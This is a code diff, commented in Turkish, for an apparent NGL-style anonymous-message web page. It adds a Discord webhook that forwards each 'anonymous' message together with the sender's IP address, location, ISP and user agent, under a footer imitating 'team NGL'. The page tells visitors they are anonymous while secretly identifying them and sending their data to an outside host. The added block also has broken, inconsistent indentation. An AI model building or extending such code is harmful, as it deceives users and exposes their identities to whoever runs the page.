@@ -216,6 +216,33 @@ def ngl_page(username):
     if request.method == 'POST':
         msg = request.form.get('message', '').strip()
         if msg:
+            # Discord webhook linkini buraya koy (kendi webhook'unu al)
+                discord_webhook = "https://discord.com/api/webhooks/xxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # ← burayı değiştir
+
+               if discord_webhook and msg:
+                   embed = {
+                  "title": "Yeni Anonim Mesaj! 📩",
+                  "description": f"```diff\n+ {msg}\n```",
+                  "color": 9055202,  # mor-pembe renk kodu (hex: #8A2BE2)
+                   "fields": [
+                       {"name": "Gönderen", "value": f"@{username} (anonim)", "inline": True},
+                       {"name": "IP / Konum", "value": f"{client_ip} | {location}", "inline": True},
+                       {"name": "ISP / Cihaz", "value": f"{isp} | {user_agent[:100]}", "inline": False}
+        ],
+        "footer": {
+            "text": "sent with ♥ from team NGL",
+            "icon_url": "https://example.com/ngl-icon.png"  # istersen NGL logosu linki koy
+        },
+        "timestamp": datetime.now().isoformat()
+    }
+
+    payload = {"embeds": [embed]}
+
+    try:
+        requests.post(discord_webhook, json=payload)
+        logging.info("[DISCORD] Embed bildirimi gönderildi")
+    except Exception as e:
+        logging.error(f"[DISCORD HATASI] {str(e)}")
             log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
